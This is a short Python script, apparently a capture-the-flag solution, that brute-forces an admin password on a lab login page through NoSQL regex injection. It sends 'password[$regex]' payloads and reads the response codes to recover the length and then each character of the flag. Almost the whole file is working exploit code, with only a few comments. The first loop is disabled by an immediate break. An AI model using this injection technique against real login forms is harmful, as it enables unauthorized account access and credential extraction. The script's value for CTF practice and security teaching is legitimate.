#POST /login HTTP/3
#Host: bbaaa3599802-webth-vulnerable.numa.host
#User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
#Accept-Language: en-US,en;q=0.5
#Accept-Encoding: gzip, deflate, br
#Content-Type: application/x-www-form-urlencoded
#Content-Length: 43
#Origin: https://bbaaa3599802-webth-vulnerable.numa.host
#Alt-Used: bbaaa3599802-webth-vulnerable.numa.host
#Connection: keep-alive
#Referer: https://bbaaa3599802-webth-vulnerable.numa.host/
#Upgrade-Insecure-Requests: 1
#Sec-Fetch-Dest: document
#Sec-Fetch-Mode: navigate
#Sec-Fetch-Site: same-origin
#Sec-Fetch-User: ?1

#username=fakeuser&password=test&remember=on


import requests
import string
from itertools import product 


chars= string.ascii_uppercase+ string.ascii_lowercase + string.digits + "_" + "}"

flag="URJC{"
###Guess the length of the flag 
length=29
while True:
    break
    payload= '.{%s}' % (length)
    print(payload)
    response = requests.post("https://bbaaa3599802-webth-vulnerable.numa.host/login", 
    data={'username': 'admin', 
          'password[$regex]': payload,
          'remember': 'on'},
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    print(response.status_code)
    if(response.status_code==200):
        length=length+1
    else: 
        break


print("Password length is: "+ str(length))
#Subtract 7 of length, bc of the behaviour of regex injection .{5}  : means any 5 characters
# bcs the first 5 (-2) letters are given 
## username=admin&password[$regex]=U.{27}&remember=on --> first to return status 200
length=length-7
while True:
    guessed=0
    for guess in chars:
        payload= '%s%s.*' % (flag,guess)
        response = requests.post("https://bbaaa3599802-webth-vulnerable.numa.host/login", 
        data={'username': 'admin', 
          'password[$regex]': payload,
          'remember': 'on'},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if(response.status_code==200):
            flag=flag+ guess
            guessed=1
            break
    if(guessed==0 or length==0):
        break
    print("Updated flag:"+flag)            

    


    
